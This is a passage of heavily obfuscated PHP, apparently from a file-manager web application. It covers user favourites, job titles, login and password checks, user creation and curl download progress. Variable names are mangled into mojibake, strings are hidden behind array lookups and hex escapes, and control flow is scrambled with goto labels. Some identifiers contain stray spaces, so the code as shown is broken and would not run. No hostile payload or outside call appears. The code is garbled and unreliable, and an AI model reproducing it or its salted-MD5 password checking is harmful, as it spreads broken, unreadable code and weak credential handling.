$aŒ—×Æª·[$BÖ¸—â‹±À[28]]; break; case $BÖ¸—â‹±À[503]: $fç¯ë’ößù = intval($cíĞÔ®«ã­[$BÖ¸—â‹±À[359]] * 0.4); break; case $BÖ¸—â‹±À[505]: $fç¯ë’ößù = intval($cíĞÔ®«ã­[$BÖ¸—â‹±À[359]] * 0.2); break; case $BÖ¸—â‹±À[507]: $fç¯ë’ößù = intval($cíĞÔ®«ã­[$BÖ¸—â‹±À[359]] * 0.4); break; } $this->update($fç¯ë’ößù); $this->sourceModelCopyFlag = !1; goto C‰ÏèªŠ¨Ú; c¢‚®‘¥½³: $aÕÉÎƒˆ =& $this->task; $this->sourceModelCopyFlag = !0; $fç¯ë’ößù = 0; goto C½³øë…¬§; C‰ÏèªŠ¨Ú: } public function sourceRemove($câ¸Ì¾„ , $D•¿Ÿ·ñÈ‡) { $C¼ÈÚíÍ° =& $_SERVER[‘®…¢À]; $this->sourceModelCopyFlag = !0; $FÛÂ’ˆ¬ó = 1; if (isset($câ¸Ì¾„ [$C¼ÈÚíÍ°[81]])) { $FÛÂ’ˆ¬ó = $câ¸Ì¾„ [$C¼ÈÚíÍ°[81]][$C¼ÈÚíÍ°[79]] + $câ¸Ì¾„ [$C¼ÈÚíÍ°[81]][$C¼ÈÚíÍ°[80]] + 1; } $this->update($FÛÂ’ˆ¬ó); $this->sourceModelCopyFlag = !1; } public function sourceMove($AÄ¥ŞÉ‹øñ) { $this->sourceRemove($AÄ¥ŞÉ‹øñ, !1); } public function curlProgress($B½æÚ‡µ®, $CƒÚŞ÷–Ê, $B¼®ßÒ¥­Õ, $cç„Ş™ÑĞè, $cæ¾ÎÖ„«Ä) { $e„ø“ìÏÁ³ =& $_SERVER[‘®…¢À]; $a¼ùĞ½˜‹‘ =& $this->task; if ($cæ¾ÎÖ„«Ä > 0) { $a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1282]] = $e„ø“ìÏÁ³[1394]; $a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1384]] = $e„ø“ìÏÁ³[92]; if ($a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1382]] == $cç„Ş™ÑĞè || $cç„Ş™ÑĞè > 1024 * 1024) { $a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1383]] = $cæ¾ÎÖ„«Ä; } if ($a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1385]]) { $a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1383]] = $cæ¾ÎÖ„«Ä + $a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1385]]; } } else { if ($B¼®ßÒ¥­Õ > 0) { if ($a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1382]] == $CƒÚŞ÷–Ê) { $a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1383]] = $B¼®ßÒ¥­Õ; $a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1282]] = $e„ø“ìÏÁ³[1395]; $a¼ùĞ½˜‹‘[$e„ø“ìÏÁ³[1384]] = $e„ø“ìÏÁ³[998]; } } } $this->update(); } public function curlProgressStart($eœ««Ù¬Å‹) { } public function curlProgressEnd($aâä¾Ê½–) { $a¢Ø»åƒÏ =& $_SERVER[‘®…¢À]; $d¬†Š†¿ğ =& $this->task; $fĞ½ˆœø£ª = curl_getinfo($aâä¾Ê½–); $AØ¼Ï–š¶Û = $fĞ½ˆœø£ª[$a¢Ø»åƒÏ[1396]]; if ($d¬†Š†¿ğ[$a¢Ø»åƒÏ[1384]] == $a¢Ø»åƒÏ[92] && $AØ¼Ï–š¶Û) { $d¬†Š†¿ğ[$a¢Ø»åƒÏ[1385]] += $AØ¼Ï–š¶Û; } $this->update(); } } goto EŠ˜ÉÚìˆÁ; d…¸ÚìŸŸ½: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($c‰£åÈî³Ğ) { $aœ÷ë‡İ =& $_SERVER[‘®…¢À]; return array($aœ÷ë‡İ[2355] => array(USER_ID, $aœ÷ë‡İ[2356])); } protected function listData() { $BŒä¾‰¦ =& $_SERVER[‘®…¢À]; $Eİ‚áÄ¾ ç = array($BŒä¾‰¦[1328] => USER_ID, $BŒä¾‰¦[431] => 0); $eóğÎ¼á¶ = $BŒä¾‰¦[2357]; $eÚ…È¤İƒ¢ = $this->field($eóğÎ¼á¶)->where($Eİ‚áÄ¾ ç)->order($BŒä¾‰¦[2358])->select(); return $eÚ…È¤İƒ¢ ? $eÚ…È¤İƒ¢ : array(); } protected function resetCache() { } protected function listView() { goto Dôù Èøä¹; E©÷Â¦àæ§: $EĞ²‘³£Ş‡ = array_to_keyvalue($EĞ²‘³£Ş‡, $F‰Û¦¯ø•[365]); foreach ($a‰×æ¿«¾— as $a÷Ñ‰Ø™¿‘ => $aœ›×Í´«) { $FÊ•¶îé Ñ = $EĞ²‘³£Ş‡[$aœ›×Í´«[$F‰Û¦¯ø•[76]]]; $FÊ•¶îé Ñ = $FÊ•¶îé Ñ ? $FÊ•¶îé Ñ : array(); $a‰×æ¿«¾—[$a÷Ñ‰Ø™¿‘] = array_merge($FÊ•¶îé Ñ, $aœ›×Í´«); } return $a‰×æ¿«¾—; goto D³˜Ã¼ôË’; Dôù Èøä¹: $F‰Û¦¯ø• =& $_SERVER[‘®…¢À]; $a‰×æ¿«¾— = $this->listData(); $A¦¬†“„¼ã = array_filter_by_field($a‰×æ¿«¾—, $F‰Û¦¯ø•[29], $F‰Û¦¯ø•[378]); goto cº‹¤Şñ³¿; d…øŞ¸…ó»: $c±Ï¤áÕù = array($F‰Û¦¯ø•[379] => array($F‰Û¦¯ø•[380], $CÀéÔ·Õ§˜)); $EĞ²‘³£Ş‡ = Model($F‰Û¦¯ø•[735])->listSource($c±Ï¤áÕù, $cñŞ³ğ‰×); $EĞ²‘³£Ş‡ = array_merge($EĞ²‘³£Ş‡[$F‰Û¦¯ø•[74]], $EĞ²‘³£Ş‡[$F‰Û¦¯ø•[75]]); goto E©÷Â¦àæ§; cº‹¤Şñ³¿: $CÀéÔ·Õ§˜ = array_to_keyvalue($A¦¬†“„¼ã, $F‰Û¦¯ø•[33], $F‰Û¦¯ø•[76]); if (!$CÀéÔ·Õ§˜) { return $a‰×æ¿«¾—; } $cñŞ³ğ‰× = 2000; goto d…øŞ¸…ó»; D³˜Ã¼ôË’: } protected function addFav($bÚŒ¼ÄƒŠ¬, $B½Æï«ˆÙ· = '', $Bâ·Äí³¸ = "\163\x6f\x75\162\x63\x65") { goto Cš‹šíƒĞ‹; c–æÖ¾“¯ã: if (!$B½Æï«ˆÙ· && $Bâ·Äí³¸ == $dˆó”°µ[378]) { $e·¥ƒô«á = Model($dˆó”°µ[1067])->where(array($dˆó”°µ[379] => $bÚŒ¼ÄƒŠ¬))->find(); if (!$e·¥ƒô«á) { return !1; } $B½Æï«ˆÙ· = $e·¥ƒô«á[$dˆó”°µ[28]]; } $B½Æï«ˆÙ· = $this->getAutoName($B½Æï«ˆÙ·); $cãñ‘œÆï = array($dˆó”°µ[1328] => USER_ID, $dˆó”°µ[431] => 0, $dˆó”°µ[382] => $B½Æï«ˆÙ·, $dˆó”°µ[383] => $bÚŒ¼ÄƒŠ¬, $dˆó”°µ[384] => $Bâ·Äí³¸, $dˆó”°µ[2004] => $C…º”ª¡¢® + 1); goto D÷İ½Öâ×½; Cš‹šíƒĞ‹: $dˆó”°µ =& $_SERVER[‘®…¢À]; $CØ½×…Ò‰ = array($dˆó”°µ[1328] => USER_ID, $dˆó”°µ[431] => 0, $dˆó”°µ[384] => $Bâ·Äí³¸, $dˆó”°µ[383] => $bÚŒ¼ÄƒŠ¬); if ($this->where($CØ½×…Ò‰)->find()) { return !1; } goto B¢ÄŞƒ¾¸ª; B¢ÄŞƒ¾¸ª: $CØ½×…Ò‰ = array($dˆó”°µ[1328] => USER_ID, $dˆó”°µ[431] => 0); $C…º”ª¡¢® = $this->where($CØ½×…Ò‰)->max($dˆó”°µ[2021]); if (!$C…º”ª¡¢®) { $C…º”ª¡¢® = 0; } goto c–æÖ¾“¯ã; D÷İ½Öâ×½: return $this->add($cãñ‘œÆï); goto c ·‡¨’·ô; c ·‡¨’·ô: } protected function remove($bÒ¬øä¾¦) { $cÅùç‘íŒ =& $_SERVER[‘®…¢À]; $FàÖÜÜ¨£¼ = array($cÅùç‘íŒ[1328] => USER_ID, $cÅùç‘íŒ[381] => $bÒ¬øä¾¦); return $this->where($FàÖÜÜ¨£¼)->delete(); } protected function removeByName($e§Šå‹…„) { $Bò—­‰ôÖà =& $_SERVER[‘®…¢À]; $bé‹†á›Ä° = array($Bò—­‰ôÖà[1328] => USER_ID, $Bò—­‰ôÖà[382] => $e§Šå‹…„, $Bò—­‰ôÖà[431] => 0); return $this->where($bé‹†á›Ä°)->delete(); } protected function rename($EµÕ„–ğ§, $fßÌ‹·æ æ) { $AíÚÎ‘Äµ™ =& $_SERVER[‘®…¢À]; if ($EµÕ„–ğ§ == $fßÌ‹·æ æ) { return !1; } $DŠÕÅïÎ”ó = $this->getAutoName($fßÌ‹·æ æ); if ($fßÌ‹·æ æ != $DŠÕÅïÎ”ó) { return !1; } $A§ÎïË‡Ÿº = array($AíÚÎ‘Äµ™[1328] => USER_ID, $AíÚÎ‘Äµ™[431] => 0, $AíÚÎ‘Äµ™[28] => $EµÕ„–ğ§); return $this->where($A§ÎïË‡Ÿº)->save(array($AíÚÎ‘Äµ™[28] => $fßÌ‹·æ æ)); } protected function resetSort($b²œùİòÖ) { $A÷İï ¥›” =& $_SERVER[‘®…¢À]; $c®¤îˆÅô¸ = array($A÷İï ¥›”[1328] => USER_ID); for ($Dí¸×ÌÍ‚ = 0; $Dí¸×ÌÍ‚ < count($b²œùİòÖ); $Dí¸×ÌÍ‚++) { $c®¤îˆÅô¸[$A÷İï ¥›”[381]] = $b²œùİòÖ[$Dí¸×ÌÍ‚]; $this->where($c®¤îˆÅô¸)->save(array($A÷İï ¥›”[2004] => $Dí¸×ÌÍ‚ + 1)); } return !0; } protected function moveTop($eò’§¦¦Çì) { goto BÛêè·éõ…; f»…¤Ï³ßš: if (!$bë†ß«ò¢¢) { return; } $c×ˆõÉÂš¦ = $this->field($F©À½´é¹µ[363])->where($f¥®®Êò)->order($F©À½´é¹µ[2358])->select(); $c×ˆõÉÂš¦ = array_to_keyvalue($c×ˆõÉÂš¦, $F©À½´é¹µ[33], $F©À½´é¹µ[363]); goto fºîÙ£šµË; fºîÙ£šµË: $D›¼¬™Ì = $c×ˆõÉÂš¦; $c×ˆõÉÂš¦ = array_remove_value($c×ˆõÉÂš¦, $bë†ß«ò¢¢[$F©À½´é¹µ[363]]); array_unshift($c×ˆõÉÂš¦, $bë†ß«ò¢¢[$F©À½´é¹µ[363]]); goto cÅÈµ­ŞË; BÛêè·éõ…: $F©À½´é¹µ =& $_SERVER[‘®…¢À]; $f¥®®Êò = array($F©À½´é¹µ[1328] => USER_ID, $F©À½´é¹µ[431] => 0); $bë†ß«ò¢¢ = $this->where($f¥®®Êò)->where(array($F©À½´é¹µ[28] => $eò’§¦¦Çì))->find(); goto f»…¤Ï³ßš; cÅÈµ­ŞË: return $this->resetSort($c×ˆõÉÂš¦); goto EÚÆ‘ˆìÃ¦; EÚÆ‘ˆìÃ¦: } protected function moveBottom($e…âÅŸâ) { $a¬Š¨õ„˜† =& $_SERVER[‘®…¢À]; $B–ˆÙ²›´† = array($a¬Š¨õ„˜†[1328] => USER_ID, $a¬Š¨õ„˜†[431] => 0); $FÎàÇÚª = $this->where($B–ˆÙ²›´†)->max($a¬Š¨õ„˜†[2021]); $Cƒ†™ÅĞ² = array($a¬Š¨õ„˜†[2021] => $FÎàÇÚª + 1); return $this->where($B–ˆÙ²›´†)->where(array($a¬Š¨õ„˜†[28] => $e…âÅŸâ))->save($Cƒ†™ÅĞ²); } private function getAutoName($EàøËòÇÜ˜) { goto b–Ú‰Ôãù ; b–Ú‰Ôãù : $B¸…ÑÆ˜‰¿ =& $_SERVER[‘®…¢À]; $bèÜÀšªŒ = array($B¸…ÑÆ˜‰¿[1328] => USER_ID, $B¸…ÑÆ˜‰¿[431] => 0); $dÎ©¦Çù¼– = $this->field($B¸…ÑÆ˜‰¿[28])->where($bèÜÀšªŒ)->select(); goto bº‡á•È—²; bº‡á•È—²: $dÎ©¦Çù¼– = array_to_keyvalue($dÎ©¦Çù¼–, $B¸…ÑÆ˜‰¿[33], $B¸…ÑÆ˜‰¿[28]); if (!$dÎ©¦Çù¼– || !in_array($EàøËòÇÜ˜, $dÎ©¦Çù¼–)) { return $EàøËòÇÜ˜; } for ($Cœö¯ˆå… = 0; $Cœö¯ˆå… < count($dÎ©¦Çù¼–); $Cœö¯ˆå…++) { if (!in_array($EàøËòÇÜ˜ . "\50{$Cœö¯ˆå…}\51", $dÎ©¦Çù¼–)) { return $EàøËòÇÜ˜ . "\50{$Cœö¯ˆå…}\x29"; } } goto AÄØÊ¬ø–; AÄØÊ¬ø–: return $EàøËòÇÜ˜ . "\x28{$Cœö¯ˆå…}\51"; goto B—“õ¡ÍÔ§; B—“õ¡ÍÔ§: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\x6a\x6f\x62\114\151\163\164"; public $field = array("\x6e\141\x6d\145", "\144\145\163\x63", "\163\157\162\x74"); const JOB_KEY = "\163\x65\154\146\x4a\157\x62\x4c\x69\163\164"; public function listData($DÁŒç¢İÉŞ = false, $CåÃ©ì¶ğ¼ = "\163\157\x72\164", $d‚šãš = false) { return parent::listData($DÁŒç¢İÉŞ, $CåÃ©ì¶ğ¼, $d‚šãš); } public function remove($FÀÊ³ŞÕ±Ä) { return parent::remove($FÀÊ³ŞÕ±Ä); } public function add($c†µ×Ãô°„) { $b”ÃÕùÅ¿— =& $_SERVER[‘®…¢À]; if ($this->findByName($c†µ×Ãô°„[$b”ÃÕùÅ¿—[28]])) { return !1; } $c†µ×Ãô°„[$b”ÃÕùÅ¿—[2021]] = $this->getSort(); return parent::insert($c†µ×Ãô°„); } private function getSort() { $dÕ‹¨„Æ¯‰ =& $_SERVER[‘®…¢À]; $dÒå™Ûß›¶ = parent::listData(); $f¿¥äùîÂË = array_to_keyvalue($dÒå™Ûß›¶, $dÕ‹¨„Æ¯‰[33], $dÕ‹¨„Æ¯‰[2021]); return empty($f¿¥äùîÂË) ? 0 : max($f¿¥äùîÂË) + 1; } public function update($a„ßÏºª, $f¥—™Â¯Ã) { $Fˆ„šö¾Ø  =& $_SERVER[‘®…¢À]; $BÇŸÚ‘¨µ† = parent::listData($a„ßÏºª); $Dë›”Öóø = $this->findByName($f¥—™Â¯Ã[$Fˆ„šö¾Ø [28]]); if (!$BÇŸÚ‘¨µ† || $Dë›”Öóø && $Dë›”Öóø[$Fˆ„šö¾Ø [363]] != $BÇŸÚ‘¨µ†[$Fˆ„šö¾Ø [363]]) { return !1; } return parent::update($a„ßÏºª, $f¥—™Â¯Ã); } public function setUserJob($D¹¡‡õ‹ïÜ, $DîÚÏ˜Çì‡) { goto A•ªŞÆ´Ÿ¶; FôĞœ¶™Í´: $c¼åãæŒŸç = array_to_keyvalue($dêĞ§Ë, $A‡ó›ˆµÌ÷[28]); $E‡°çª¼ã  = $A‡ó›ˆµÌ÷[357]; foreach ($DîÚÏ˜Çì‡ as $F÷Á‚²Èöã) { if ($c¼åãæŒŸç[$F÷Á‚²Èöã]) { $E‡°çª¼ã  .= $c¼åãæŒŸç[$F÷Á‚²Èöã][$A‡ó›ˆµÌ÷[363]] . $A‡ó›ˆµÌ÷[47]; } else { $fò‰§¿óíš = $this->add($F÷Á‚²Èöã); $E‡°çª¼ã  .= $fò‰§¿óíš . $A‡ó›ˆµÌ÷[47]; } } goto f…šİÄÀ®É; f…šİÄÀ®É: $E‡°çª¼ã  = rtrim($E‡°çª¼ã , $A‡ó›ˆµÌ÷[47]); Model($A‡ó›ˆµÌ÷[468])->metaSet($D¹¡‡õ‹ïÜ, self::JOB_KEY, $E‡°çª¼ã ); goto D–±ªööëÈ; A•ªŞÆ´Ÿ¶: $A‡ó›ˆµÌ÷ =& $_SERVER[‘®…¢À]; if (!is_array($DîÚÏ˜Çì‡)) { $DîÚÏ˜Çì‡ = array($DîÚÏ˜Çì‡); } $dêĞ§Ë = parent::listData(); goto FôĞœ¶™Í´; D–±ªööëÈ: } public function getUserJob($Bã¬¤‹ìµÁ) { $d¢¶âŸÂî¯ = Model($_SERVER[‘®…¢À][468])->metaGet($Bã¬¤‹ìµÁ); return $this->getUserJobInfo($d¢¶âŸÂî¯[self::JOB_KEY]); } public function getUserJobInfo($fùöÕŠ‘±») { goto Fù‡ùˆœ†ê; A¹äõÍ÷ÜÁ: return $Aóª‘¢›ˆ; goto Bò¹Ë­ùŒ…; Fù‡ùˆœ†ê: $BÕéï™™Ø¸ =& $_SERVER[‘®…¢À]; $bŒ‡½‚µ— = explode($BÕéï™™Ø¸[47], $fùöÕŠ‘±»); $bÂÙŞÉÉŠ = parent::listData(); goto c‹Î¾Ÿ‹ñµ; c‹Î¾Ÿ‹ñµ: $bÂÙŞÉÉŠ = array_remove_key($bÂÙŞÉÉŠ, $BÕéï™™Ø¸[184]); $Aóª‘¢›ˆ = array(); foreach ($bŒ‡½‚µ— as $dÍÊ„ëÖ‘ä) { if (isset($bÂÙŞÉÉŠ[$dÍÊ„ëÖ‘ä])) { $Aóª‘¢›ˆ[] = $bÂÙŞÉÉŠ[$dÍÊ„ëÖ‘ä]; } } goto A¹äõÍ÷ÜÁ; Bò¹Ë­ùŒ…: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\x6d\x65" => "\165\163\x65\162\137\155\145\164\x61", "\x6d\145\x74\x61\106\x69\x65\154\x64" => "\x75\163\x65\162\x49\x44"); protected $simpleField = "\165\163\145\162\111\104\54\x6e\x69\x63\x6b\x4e\x61\x6d\145\x2c\156\141\155\x65\x2c\x61\x76\141\164\x61\162\54\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($a…ê¯ÑÒ) { $eÅ»‹÷·‰Ç =& $_SERVER[‘®…¢À]; return array($eÅ»‹÷·‰Ç[2067] => array($a…ê¯ÑÒ[0], $eÅ»‹÷·‰Ç[2359]), $eÅ»‹÷·‰Ç[2069] => array($a…ê¯ÑÒ[0], $eÅ»‹÷·‰Ç[2359])); } protected function getInfo($fí»Í¤â–÷, $B­»ØŞÉ‚á = false) { $B¶³õñƒª =& $_SERVER[‘®…¢À]; $cñ´ñ±Ëéœ = $this->getInfoSimple($fí»Í¤â–÷); if (!is_array($cñ´ñ±Ëéœ)) { return array(); } if ($B­»ØŞÉ‚á) { goto DïÆÊƒäŒ; bŞàõøÛìÀ: $fë³êò¶‰ç = Model($B¶³õñƒª[1067])->metaGet($cñ´ñ±Ëéœ[$B¶³õñƒª[387]][$B¶³õñƒª[365]]); $cñ´ñ±Ëéœ[$B¶³õñƒª[2362]] = $eìî†ñºõÖ; $cñ´ñ±Ëéœ[$B¶³õñƒª[387]][$B¶³õñƒª[2215]] = isset($fë³êò¶‰ç[$B¶³õñƒª[2216]]) ? $fë³êò¶‰ç[$B¶³õñƒª[2216]] : null; goto c´Í¢­‘Ï; c´Í¢­‘Ï: return $cñ´ñ±Ëéœ; goto F³Úî§‡½; DïÆÊƒäŒ: if (!$cñ´ñ±Ëéœ) { return $cñ´ñ±Ëéœ; } $eìî†ñºõÖ = md5($B¶³õñƒª[2360] . $cñ´ñ±Ëéœ[$B¶³õñƒª[782]] . $B¶³õñƒª[2361] . $cñ´ñ±Ëéœ[$B¶³õñƒª[28]]); $cñ´ñ±Ëéœ = $this->_listDataApplyItem($cñ´ñ±Ëéœ); goto bŞàõøÛìÀ; F³Úî§‡½: } return $this->cacheFunctionGet($B¶³õñƒª[2110], $fí»Í¤â–÷); } protected function getInfoSimple($cÄÍŠªæ¤, $AšœæÌŒøË = false) { $eºØÄ™†àà =& $_SERVER[‘®…¢À]; if (!$cÄÍŠªæ¤) { return array(); } if ($AšœæÌŒøË) { $BÉáÇÉŞ¾ = $this->where(array($eºØÄ™†àà[1337] => intval($cÄÍŠªæ¤)))->find(); if (!is_array($BÉáÇÉŞ¾)) { return array(); } $BÉáÇÉŞ¾[$eºØÄ™†àà[2363]] = Action($eºØÄ™†àà[2364])->parseUrl($BÉáÇÉŞ¾[$eºØÄ™†àà[2363]]); return $BÉáÇÉŞ¾; } return $this->cacheFunctionGet($eºØÄ™†àà[2070], $cÄÍŠªæ¤); } protected function getInfoSimpleOuter($AµŸ…ñÂù) { goto fâ÷÷š„²ß; fâ÷÷š„²ß: $FÙŠ»Üñ¾ =& $_SERVER[‘®…¢À]; if (!$AµŸ…ñÂù || $AµŸ…ñÂù == 0) { return array($FÙŠ»Üñ¾[1337] => $FÙŠ»Üñ¾[463], $FÙŠ»Üñ¾[28] => $FÙŠ»Üñ¾[154] . LNG($FÙŠ»Üñ¾[2365]) . $FÙŠ»Üñ¾[467], $FÙŠ»Üñ¾[2363] => STATIC_PATH . $FÙŠ»Üñ¾[2366]); } $Eì¼‘Ùù‘ = $this->cacheFunctionGet($FÙŠ»Üñ¾[2070], $AµŸ…ñÂù); goto FÅ‚”Ó«§ù; e¹Îª‹ÏŒ¢: return $cïˆ™ºèÎØ; goto B‹ÉË†æ Ğ; FÅ‚”Ó«§ù: $cïˆ™ºèÎØ = array_field_key($Eì¼‘Ùù‘, explode($FÙŠ»Üñ¾[47], $this->simpleField)); if (!$cïˆ™ºèÎØ) { return array($FÙŠ»Üñ¾[1337] => $FÙŠ»Üñ¾[989], $FÙŠ»Üñ¾[28] => $FÙŠ»Üñ¾[154] . LNG($FÙŠ»Üñ¾[2367]) . $FÙŠ»Üñ¾[467], $FÙŠ»Üñ¾[2363] => STATIC_PATH . $FÙŠ»Üñ¾[2368]); } $cïˆ™ºèÎØ[$FÙŠ»Üñ¾[2363]] = Action($FÙŠ»Üñ¾[2364])->parseUrl($cïˆ™ºèÎØ[$FÙŠ»Üñ¾[2363]]); goto e¹Îª‹ÏŒ¢; B‹ÉË†æ Ğ: } protected function groupUser($f¶•¦à­¼È) { } public static function errorLang($B¤®„Ş†ªŸ) { $f ÑÔ®›Æ =& $_SERVER[‘®…¢À]; $bò–¯Õ† = array(self::ERROR_USER_NOT_EXISTS => $f ÑÔ®›Æ[2369], self::ERROR_USER_PASSWORD_ERROR => $f ÑÔ®›Æ[2370], self::ERROR_USER_EXIST_NAME => $f ÑÔ®›Æ[2371], self::ERROR_USER_EXIST_PHONE => $f ÑÔ®›Æ[2372], self::ERROR_USER_EXIST_EMAIL => $f ÑÔ®›Æ[2373], self::ERROR_USER_LOGIN_LOCK => $f ÑÔ®›Æ[2374], self::ERROR_IP_NOT_ALLOW => $f ÑÔ®›Æ[2375], self::ERROR_USER_EXIST_NICKNAME => $f ÑÔ®›Æ[2376]); return LNG($bò–¯Õ†[$B¤®„Ş†ªŸ]); } public function getInfoByMeta($b¼ğ±šœ¸Œ, $a”…‘³ôÑõ) { $aÈá×ÕŒ­è =& $_SERVER[‘®…¢À]; $fà¡İïÙ…å = Model($aÈá×ÕŒ­è[2377])->where(array($aÈá×ÕŒ­è[90] => $b¼ğ±šœ¸Œ, $aÈá×ÕŒ­è[355] => $a”…‘³ôÑõ))->find(); if ($fà¡İïÙ…å) { return $this->getInfo($fà¡İïÙ…å[$aÈá×ÕŒ­è[1337]]); } return !1; } public function userLoginCheck($cÛà–‚¥Ö, $cñ«¤šåã) { goto CÎ‘¡æîÅá; CÎ‘¡æîÅá: $aÕ£â½‰Š =& $_SERVER[‘®…¢À]; $d…©¡²§ìÒ = array($aÕ£â½‰Š[28] => $cÛà–‚¥Ö, $aÕ£â½‰Š[2218] => $cÛà–‚¥Ö, $aÕ£â½‰Š[290] => $cÛà–‚¥Ö, $aÕ£â½‰Š[2378] => $cÛà–‚¥Ö, $aÕ£â½‰Š[895] => $aÕ£â½‰Š[897]); if ($this->nickNameRpt()) { unset($d…©¡²§ìÒ[$aÕ£â½‰Š[2218]]); } goto eÆÂ¸Ûé˜æ; F…´°ØÒƒÄ: $this->userEdit($eÀ©ë…Ší•[$aÕ£â½‰Š[1337]], array($aÕ£â½‰Š[2379] => time())); $this->clearCache($eÀ©ë…Ší•[$aÕ£â½‰Š[1337]]); return $this->getInfo($eÀ©ë…Ší•[$aÕ£â½‰Š[1337]]); goto dÕ›È¦‘ã‹; eÆÂ¸Ûé˜æ: $eÀ©ë…Ší• = $this->where($d…©¡²§ìÒ)->find(); if (!$eÀ©ë…Ší•) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($eÀ©ë…Ší•[$aÕ£â½‰Š[1337]], $cñ«¤šåã)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto F…´°ØÒƒÄ; dÕ›È¦‘ã‹: } public function clearCache($Cêî…Ğäà²) { $DƒØšÁÓ°ç =& $_SERVER[‘®…¢À]; $this->cacheFunctionClear($DƒØšÁÓ°ç[2110], $Cêî…Ğäà²); $this->cacheFunctionClear($DƒØšÁÓ°ç[2070], $Cêî…Ğäà²); } public function userPasswordCheck($aÀáøæùÈí, $cõÔã­Â‚) { $DéÏ—ªšëå =& $_SERVER[‘®…¢À]; $DóÖØ˜§† = $this->where(array($DéÏ—ªšëå[1337] => intval($aÀáøæùÈí)))->find(); $fÊØß™“£ = $this->metaGet($aÀáøæùÈí); $e½ù³µŒİœ = isset($fÊØß™“£[$DéÏ—ªšëå[2380]]) ? $fÊØß™“£[$DéÏ—ªšëå[2380]] : $DéÏ—ªšëå[33]; if (md5($e½ù³µŒİœ . trim($cõÔã­Â‚)) !== $DóÖØ˜§†[$DéÏ—ªšëå[782]]) { return !1; } return !0; } public function userAdd($bŠÖîëº›¥) { goto d³´¥öì¤Ì; d³´¥öì¤Ì: $e¢õ¨Ô·õ =& $_SERVER[‘®…¢À]; $a£›±òƒõß = array($e¢õ¨Ô·õ[382] => $bŠÖîëº›¥[$e¢õ¨Ô·õ[28]], $e¢õ¨Ô·õ[2381] => $bŠÖîëº›¥[$e¢õ¨Ô·õ[2382]], $e¢õ¨Ô·õ[2383] => isset($bŠÖîëº›¥[$e¢õ¨Ô·õ[290]]) ? $bŠÖîëº›¥[$e¢õ¨Ô·õ[290]] : $e¢õ¨Ô·õ[33], $e¢õ¨Ô·õ[2384] => isset($bŠÖîëº›¥[$e¢õ¨Ô·õ[2378]]) ? $bŠÖîëº›¥[$e¢õ¨Ô·õ[2378]] : $e¢õ¨Ô·õ[33], $e¢õ¨Ô·õ[2385] => isset($bŠÖîëº›¥[$e¢õ¨Ô·õ[2218]]) ? $bŠÖîëº›¥[$e¢õ¨Ô·õ[2218]] : $bŠÖîëº›¥[$e¢õ¨Ô·õ[28]], $e¢õ¨Ô·õ[2386] => isset($bŠÖîëº›¥[$e¢õ¨Ô·õ[2363]]) ? $bŠÖîëº›¥[$e¢õ¨Ô·õ[2363]] : $e¢õ¨Ô·õ[33], $e¢õ¨Ô·õ[2387] => isset($bŠÖîëº›¥[$e¢õ¨Ô·õ[2388]]) ? $bŠÖîëº›¥[$e¢õ¨Ô·õ[2388]] : 1, $e¢õ¨Ô·õ[2389] => $bŠÖîëº›¥[$e¢õ¨Ô·õ[782]], $e¢õ¨Ô·õ[2072] => isset($bŠÖîëº›¥[$e¢õ¨Ô·õ[1984]]) ? $bŠÖîëº›¥[$e¢õ¨Ô·õ[1984]] : 1024 * 1024 * 20, $e¢õ¨Ô·õ[2073] => 0, $e¢õ¨Ô·õ[2379] => 0, $e¢õ¨Ô·õ[2097] => isset($bŠÖîëº›¥[$e¢õ¨Ô·õ[662]]) ? $bŠÖîëº›¥[$e¢õ¨Ô·õ[662]] : 1); if (!empty($bŠÖîëº›¥[$e¢õ¨Ô·õ[1337]])) { $a£›±òƒõß[$e¢õ¨Ô·õ[1337]] = $bŠÖîëº›¥[$e¢õ¨Ô·õ[1337]]; } goto fª±Éô…Ô±; CÄîŸô³Û¢: $FÖªÁ˜ÅŒá = array($e¢õ¨Ô·õ[2389] => $a£›±òƒõß[$e¢õ¨Ô·õ[782]], $e¢õ¨Ô·õ[2385] => $a£›±òƒõß[$e¢õ¨Ô·õ[2218]]); $this->userEdit($AŒîÕ´ºÉè, $FÖªÁ˜ÅŒá); Model($e¢õ¨Ô·õ[1067])->userRootAdd($AŒîÕ´ºÉè); goto a˜¹°ªï†; fª±Éô…Ô±: $B˜Î¨¢…œî = $this->_checkExist($bŠÖîëº›¥); if ($B˜Î¨¢…œî !== !0) { return $B˜Î¨¢…œî; } $AŒîÕ´ºÉè = $this->add($a£›±òƒõß); goto CÄîŸô³Û¢; a˜¹°ªï†: return $AŒîÕ´ºÉè; goto C ¶„îíãï; C ¶„îíãï: } protected function userEditTest($f¼†ÀÂ‚Ï, $A¹³Ñ‡åàÃ) { return $this->call($_SERVER[‘®…¢À][2390], $f¼†ÀÂ‚Ï, $A¹³Ñ‡åàÃ); } protected function userEdit($C””½…×³è, $a‚¦·ÆŒƒò) { goto cˆƒ®µ…¬¿; cˆƒ®µ…¬¿: $BÒ‰Äõ˜ˆò =& $_SERVER[‘®…¢À]; $F¡Ë±œåµ = $this->getInfoSimple($C””½…×³è); if (!$F¡Ë±œåµ) { return !1; } goto F„Â‰‰„áÁ; 